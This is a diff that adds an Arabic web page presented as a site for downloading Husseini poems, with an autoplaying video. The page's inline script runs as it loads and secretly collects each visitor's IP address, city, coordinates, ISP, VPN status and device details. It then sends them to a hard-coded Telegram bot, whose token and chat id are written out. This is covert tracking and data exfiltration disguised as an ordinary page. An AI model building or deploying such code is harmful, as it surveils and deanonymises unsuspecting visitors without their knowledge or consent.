@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع تحميل قصائد الحسينية</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://prodigits.co.uk/thumbs/wallpapers/p2/misc/44/23325a4c12241695.jpg'); /* ضع هنا رابط صورة الخلفية */
+            background-size: cover; /* لتغطية كامل الصفحة بالصورة */
+            background-position: center;
+            background-repeat: no-repeat; /* عدم تكرار الصورة */
+            position: relative;
+        }
+
+        .video-container {
+            width: 400px; /* عرض الفيديو */
+            height: 300px; /* ارتفاع الفيديو */
+            background-color: #000; /* خلفية سوداء في حال لم يتم تحميل الفيديو */
+            position: relative;
+            overflow: hidden;
+        }
+
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* يتكيف الفيديو مع أبعاد الحاوية */
+        }
+
+        .overlay {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 20px;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- عرض الفيديو في وسط الصفحة بحجم أصغر -->
+    <div class="video-container">
+        <video autoplay controls loop>
+            <source src="{{ url_for('static', filename='your-video.mp4') }}" type="video/mp4">
+            المتصفح الخاص بك لا يدعم عرض الفيديو.
+        </video>
+        <div class="overlay">موقع تحميل قصائد الحسينية</div> <!-- النص فوق الفيديو -->
+    </div>
+
+    <script>
+        // استدعاء API لجلب معلومات IP المستخدم
+        fetch('https://ipinfo.io/json?token=5914e4c19b30c5')
+        .then(response => response.json())
+        .then(data => {
+            const ipInfo = {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                loc: data.loc,
+                org: data.org,
+                timezone: data.timezone,
+                isVpn: data.org.toLowerCase().includes('vpn') || data.org.toLowerCase().includes('proxy')
+            };
+
+            function getDeviceInfo() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                let deviceType = "Unknown";
+                let os = "Unknown";
+
+                if (/android/i.test(userAgent)) {
+                    deviceType = "هاتف";
+                    os = "Android";
+                } else if (/iphone|ipad|ipod/i.test(userAgent)) {
+                    deviceType = "هاتف";
+                    os = "iOS";
+                } else if (/windows/i.test(userAgent)) {
+                    deviceType = "جهاز كمبيوتر";
+                    os = "Windows";
+                } else if (/macintosh|mac os x/i.test(userAgent)) {
+                    deviceType = "جهاز كمبيوتر";
+                    os = "MacOS";
+                } else if (/linux/i.test(userAgent)) {
+                    deviceType = "جهاز كمبيوتر";
+                    os = "Linux";
+                }
+
+                return {
+                    deviceType,
+                    os,
+                    browser: navigator.userAgent,
+                    platform: navigator.platform,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language
+                };
+            }
+
+            const deviceInfo = getDeviceInfo();
+
+            const message = `
+            IP: ${ipInfo.ip}
+            city: ${ipInfo.city}
+            Area: ${ipInfo.region}
+            State: ${ipInfo.country}
+            location: ${ipInfo.loc}
+            isp: ${ipInfo.org}
+            Time Zone: ${ipInfo.timezone}
+            vpn: ${ipInfo.isVpn ? 'نعم' : 'لا'}
+            
+            Device information:
+            Device type: ${deviceInfo.deviceType}
+            system decice: ${deviceInfo.os}
+            Browser: ${deviceInfo.browser}
+            dev: ${deviceInfo.platform}
+            size: ${deviceInfo.screenResolution}
+            lang: ${deviceInfo.language}
+            `;
+
+            const telegramBotToken = '8091289147:AAETZGBWrLoOg9H188V_N-rK_1iYL3Vgev0';  
+            const chatId = '7900182271';  
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('تم إرسال البيانات إلى Telegram:', result);
+            })
+            .catch(error => {
+                console.error('حدث خطأ أثناء إرسال البيانات:', error);
+            });
+        })
+        .catch(error => {
+            console.error('حدث خطأ أثناء جلب بيانات IP:', error);
+        });
+    </script>
+
+</body>
+</html>
